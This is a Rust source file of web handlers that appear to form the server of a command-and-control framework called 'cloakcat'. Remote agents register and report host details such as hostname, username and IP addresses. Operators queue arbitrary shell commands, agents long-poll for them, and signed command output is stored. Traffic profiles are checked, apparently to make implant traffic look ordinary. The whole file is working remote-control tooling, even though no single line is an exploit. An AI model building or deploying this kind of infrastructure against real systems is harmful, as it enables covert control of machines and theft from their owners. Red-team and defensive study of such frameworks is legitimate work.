//! HTTP request handlers.

use axum::{
    extract::{OriginalUri, Path, Query, State},
    http::{HeaderMap, StatusCode},
    Json,
};
use base64::engine::general_purpose::STANDARD_NO_PAD as B64;
use base64::Engine;
use serde::Deserialize;
use tokio::time::{sleep, Duration, Instant};
use uuid::Uuid;

use cloakcat_protocol::{Command, RegisterReq, ResultReq, verify_result};
use subtle::ConstantTimeEq;

use crate::db;
use crate::state::{AgentView, AppState, ResultView};
use crate::validation::validate_profile_request;

// ========== Request/Query types ==========

#[derive(Deserialize)]
pub struct PushCmdReq {
    pub command: String,
}

#[derive(Deserialize)]
pub struct UpdateAliasReq {
    pub alias: Option<String>,
    pub note: Option<String>,
}

#[derive(Deserialize)]
pub struct HoldParam {
    pub hold: Option<u64>,
}

#[derive(Deserialize)]
pub struct ListResults {
    pub agent_id: Option<String>,
    pub limit: Option<usize>,
}

#[derive(Deserialize)]
pub struct ListAudit {
    pub actor: Option<String>,
    pub agent_id: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Deserialize)]
pub struct TagsPayload {
    #[serde(default)]
    pub tags: Vec<String>,
}

// ========== Handlers ==========

pub async fn ping_handler() -> &'static str {
    "pong"
}

pub async fn admin_agents(State(state): State<AppState>) -> Json<Vec<AgentView>> {
    match db::list_agents(&state.db).await {
        Ok(list) => Json(list.into_iter().map(AgentView::from).collect()),
        Err(e) => {
            eprintln!("[admin_agents] failed to list agents: {}", e);
            Json(vec![])
        }
    }
}

pub async fn admin_update_agent_alias(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<UpdateAliasReq>,
) -> (axum::http::StatusCode, Json<serde_json::Value>) {
    match db::update_agent_alias(
        &state.db,
        &agent_id,
        body.alias.as_deref(),
        body.note.as_deref(),
    )
    .await
    {
        Ok(updated) => (
            axum::http::StatusCode::OK,
            Json(serde_json::to_value(AgentView::from(updated)).unwrap()),
        ),
        Err(e) => {
            let status = match e.downcast_ref::<sqlx::Error>() {
                Some(sqlx::Error::RowNotFound) => axum::http::StatusCode::NOT_FOUND,
                _ => axum::http::StatusCode::INTERNAL_SERVER_ERROR,
            };
            eprintln!(
                "[admin_update_agent_alias] failed: agent_id={} err={}",
                agent_id, e
            );
            (
                status,
                Json(serde_json::json!({ "status": "error", "message": "update_failed" })),
            )
        }
    }
}

pub async fn admin_results(
    State(state): State<AppState>,
    Query(q): Query<ListResults>,
) -> Json<Vec<ResultView>> {
    let limit = q.limit.unwrap_or(20).min(200);
    let limit_i64 = limit as i64;

    match db::list_results(&state.db, q.agent_id.as_deref(), limit_i64).await {
        Ok(list) => Json(
            list.into_iter()
                .map(|r| ResultView {
                    agent_id: r.agent_id,
                    cmd_id: r.command_id.to_string(),
                    exit_code: r.exit_code,
                    stdout: r.stdout,
                    stderr: r.stderr,
                    ts_ms: r.created_at.timestamp_millis(),
                })
                .collect(),
        ),
        Err(e) => {
            eprintln!("[admin_results] failed to list results: {}", e);
            Json(vec![])
        }
    }
}

pub async fn admin_audit(
    State(state): State<AppState>,
    Query(q): Query<ListAudit>,
) -> Json<Vec<db::AuditRecord>> {
    let limit = q.limit.unwrap_or(50).max(1);
    match db::list_audit(
        &state.db,
        limit,
        q.actor.as_deref(),
        q.agent_id.as_deref(),
    )
    .await
    {
        Ok(list) => Json(list),
        Err(e) => {
            eprintln!("[admin_audit] failed: {}", e);
            Json(vec![])
        }
    }
}

pub async fn admin_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
) -> (axum::http::StatusCode, Json<serde_json::Value>) {
    match db::get_agent_by_id(&state.db, &agent_id).await {
        Ok(Some(agent)) => (
            axum::http::StatusCode::OK,
            Json(serde_json::json!({ "tags": agent.tags })),
        ),
        Ok(None) => (
            axum::http::StatusCode::NOT_FOUND,
            Json(serde_json::json!({ "status": "unknown_agent" })),
        ),
        Err(e) => {
            eprintln!("[admin_agent_tags] failed: {}", e);
            (
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({ "status": "error" })),
            )
        }
    }
}

pub async fn admin_set_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<TagsPayload>,
) -> (axum::http::StatusCode, Json<serde_json::Value>) {
    match db::update_agent_tags(&state.db, &agent_id, &body.tags).await {
        Ok(agent) => (
            axum::http::StatusCode::OK,
            Json(serde_json::json!({ "tags": agent.tags })),
        ),
        Err(e) if matches!(e.downcast_ref::<sqlx::Error>(), Some(sqlx::Error::RowNotFound)) => (
            axum::http::StatusCode::NOT_FOUND,
            Json(serde_json::json!({ "status": "unknown_agent" })),
        ),
        Err(e) => {
            eprintln!("[admin_set_agent_tags] failed: {}", e);
            (
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({ "status": "error" })),
            )
        }
    }
}

pub async fn register_handler(
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<RegisterReq>,
) -> (StatusCode, Json<serde_json::Value>) {
    // X-Agent-Token validated below. Ensure TLS is enabled in production
    // to prevent token interception (see TLS_CERT_PATH / TLS_KEY_PATH).
    let agent_token = headers
        .get("X-Agent-Token")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");
    let expected = &state.shared_token;
    let ct_match: bool = expected.as_slice().ct_eq(agent_token.as_bytes()).into();
    if expected.is_empty() || !ct_match {
        return (
            StatusCode::UNAUTHORIZED,
            Json(serde_json::json!({"status":"bad_token"})),
        );
    }

    if let Ok(Some(agent)) = db::get_agent_by_id(&state.db, &payload.agent_id).await {
        if let Some(resp) =
            validate_profile_request(agent.profile_name.as_deref(), uri.path(), &headers)
        {
            return (StatusCode::FORBIDDEN, resp);
        }
    }

    // token_b64 is a legacy field kept for DB compatibility; HMAC now uses SHARED_TOKEN env var
    let token_b64 = B64.encode(Uuid::new_v4().as_bytes());

    if let Err(e) = db::upsert_agent(
        &state.db,
        &payload.agent_id,
        &payload.platform,
        &token_b64,
        payload.alias.as_deref(),
        payload.note.as_deref(),
        payload.hostname.as_deref(),
        payload.username.as_deref(),
        payload.os_version.as_deref(),
        payload.ip_addrs.as_deref(),
        None,
    )
    .await
    {
        eprintln!("failed to upsert agent {}: {}", payload.agent_id, e);
    }

    println!(
        "Agent registered: id={}, platform={}",
        payload.agent_id, payload.platform
    );

    (
        StatusCode::OK,
        Json(serde_json::json!({
            "status": "ok",
            "message": format!("Welcome, agent {}", payload.agent_id),
            "token": token_b64,
        })),
    )
}

pub async fn push_command_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(req): Json<PushCmdReq>,
) -> Json<serde_json::Value> {
    if let Err(e) = db::insert_command(&state.db, &agent_id, &req.command).await {
        eprintln!("failed to insert command for {}: {}", agent_id, e);
        return Json(serde_json::json!({ "status": "error" }));
    }

    if let Err(e) = db::insert_audit(
        &state.db,
        "catctl",
        "TASK_CREATE",
        "agent",
        &agent_id,
        &serde_json::json!({ "command": req.command }),
    )
    .await
    {
        eprintln!("[audit] failed to insert audit log: {}", e);
    }

    println!("Command queued for {}: {}", agent_id, req.command);

    Json(serde_json::json!({ "status": "ok" }))
}

pub async fn poll_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Query(q): Query<HoldParam>,
) -> (axum::http::StatusCode, Json<serde_json::Value>) {
    let hold = q.hold.unwrap_or(0).min(120);
    let deadline = Instant::now() + Duration::from_secs(hold);

    let agent = match db::get_agent_by_id(&state.db, &agent_id).await {
        Ok(Some(a)) => a,
        Ok(None) => {
            return (
                axum::http::StatusCode::NOT_FOUND,
                Json(serde_json::json!({ "status": "unknown_agent" })),
            )
        }
        Err(e) => {
            eprintln!("[poll] agent lookup failed: agent_id={} err={}", agent_id, e);
            return (
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({})),
            );
        }
    };

    if let Some(resp) =
        validate_profile_request(agent.profile_name.as_deref(), uri.path(), &headers)
    {
        return (axum::http::StatusCode::FORBIDDEN, resp);
    }

    loop {
        match db::get_oldest_command_for_agent(&state.db, &agent_id).await {
            Ok(Some(cmd_rec)) => {
                let cmd = Command {
                    cmd_id: cmd_rec.id.to_string(),
                    command: cmd_rec.command,
                };
                println!(
                    "[server] poll hit: agent={} -> dispatch cmd {}",
                    agent_id, cmd.cmd_id
                );
                return (
                    axum::http::StatusCode::OK,
                    Json(serde_json::to_value(cmd).unwrap()),
                );
            }
            Ok(None) => {}
            Err(e) => {
                eprintln!(
                    "[server] poll error: agent={} -> db lookup failed: {}",
                    agent_id, e
                );
                return (
                    axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                    Json(serde_json::json!({})),
                );
            }
        }

        if hold == 0 {
            println!("[server] poll idle: agent={} -> 204 (hold=0)", agent_id);
            return (
                axum::http::StatusCode::NO_CONTENT,
                Json(serde_json::json!({})),
            );
        }

        if Instant::now() >= deadline {
            println!("[server] poll idle: agent={} -> 204 (timeout)", agent_id);
            return (
                axum::http::StatusCode::NO_CONTENT,
                Json(serde_json::json!({})),
            );
        }

        sleep(Duration::from_millis(300)).await;
    }
}

pub async fn result_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(req): Json<ResultReq>,
) -> Json<serde_json::Value> {
    let agent = match db::get_agent_by_id(&state.db, &agent_id).await {
        Ok(Some(a)) => a,
        Ok(None) => return Json(serde_json::json!({ "status": "unknown_agent" })),
        Err(e) => {
            eprintln!(
                "[result] agent lookup failed: agent_id={} err={}",
                agent_id, e
            );
            return Json(serde_json::json!({ "status": "error" }));
        }
    };

    if let Some(resp) =
        validate_profile_request(agent.profile_name.as_deref(), uri.path(), &headers)
    {
        return resp;
    }

    if !verify_result(&agent_id, &req.cmd_id, &req.stdout, &req.signature, &state.shared_token) {
        return Json(serde_json::json!({ "status": "bad_signature" }));
    }

    let cmd_uuid = match Uuid::parse_str(&req.cmd_id) {
        Ok(id) => id,
        Err(_) => return Json(serde_json::json!({ "status": "bad_cmd_id" })),
    };

    if let Err(e) = db::insert_result(
        &state.db,
        &agent_id,
        cmd_uuid,
        req.exit_code,
        &req.stdout,
        &req.stderr,
    )
    .await
    {
        eprintln!(
            "[result] failed to insert result: agent={} cmd_id={} err={}",
            agent_id, req.cmd_id, e
        );
        return Json(serde_json::json!({ "status": "error" }));
    }

    // preserving existing token_b64; unused for HMAC verification
    if let Err(e) = db::upsert_agent(
        &state.db,
        &agent.agent_id,
        &agent.platform,
        &agent.token_b64,
        agent.alias.as_deref(),
        agent.note.as_deref(),
        agent.hostname.as_deref(),
        agent.username.as_deref(),
        agent.os_version.as_deref(),
        agent.ip_addrs.as_deref(),
        Some(agent.tags.as_slice()),
    )
    .await
    {
        eprintln!(
            "[result] failed to refresh agent last_seen: agent={} err={}",
            agent_id, e
        );
    }

    println!(
        "[result] agent={} cmd_id={} exit={} stdout=\"{}\" stderr=\"{}\"",
        agent_id, req.cmd_id, req.exit_code, req.stdout, req.stderr
    );
    Json(serde_json::json!({ "status": "ok" }))
}
